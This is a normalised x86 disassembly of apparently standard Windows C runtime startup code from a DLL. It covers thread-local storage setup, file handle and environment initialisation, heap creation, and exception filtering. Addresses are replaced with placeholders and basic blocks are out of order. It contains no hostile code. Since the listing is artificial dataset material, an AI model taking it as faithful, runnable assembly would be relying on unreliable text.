retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10027b60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100279c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100279c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100279c4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027b60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027b60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027b60 ]
sub_10027bbd
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_100236d8
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_10027c38
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_100236d8
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_10027cb3
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_10027c38
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_10027ce7
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_100207fd
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_10027d24
push 0xc
push r--data
call sub_10028b48
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_100236d8
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027df9
push 0xc
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_10025006
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027e02
call sub_10028b8d
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_10027e0b
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_10027cb3
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_10026cea
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_100207fd
pop ecx
xor esi esi
push 0x0
push esi
call sub_10027d24
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10027e9e
push 0x8
push r--data
call sub_10028b48
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10028b8d
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_100207fd
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_100207fd
pop ecx
push 0xd
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_100207fd
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027fb8
push 0xc
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027fc4
push esi
call sub_100207fd
pop ecx
push edi
call sub_10025095
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_100207fd
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10024ebd
pop ecx
sub_10027fcd
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_10027e9e
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1002803b
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_100236d8
pop ecx
call sub_10027ce7
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_10027caa
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_100239b3
push [ rw-data ]
call sub_10027bbd
push [ rw-data ]
mov [ rw-data ] eax
call sub_10027bbd
push [ rw-data ]
mov [ rw-data ] eax
call sub_10027bbd
push [ rw-data ]
mov [ rw-data ] eax
call sub_10027bbd
add esp 0x10
mov [ rw-data ] eax
call sub_10028dd2
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_10027e9e
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_10026cea
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_10027d24
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_100281c8
push 0x54
push r--data
call sub_10028b48
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_10026cea
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_10026cea
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_10028b8d
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1002d8b2
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1002d8b2
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_1002841c
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_100207fd
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_1002846a
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1002d3a7
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_10026cea
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_100200e0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_100200e0
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_100207fd
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_10026cea
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_100207fd
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
sub_10028548
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_100318fa
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_100318fa
pop ecx
test eax eax
je r-xdata
call sub_100318fa
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_100286e2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1002d3a7
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10028548
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10026ca5
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10028548
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1002879d
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_10026ca5
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_10026ca5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_10026940
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_100207fd
pop ecx
mov [ ebp - 0x4 ] ebx
sub_100288d4
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100288fa
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10028920
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_10028950
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_100289c5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_10027e0b
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_10028b25
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_100289c5
pop ecx
pop ecx
pop ebp
retn
sub_10028b48
push sub_10028bb0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10028bb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10020040
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10020040
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
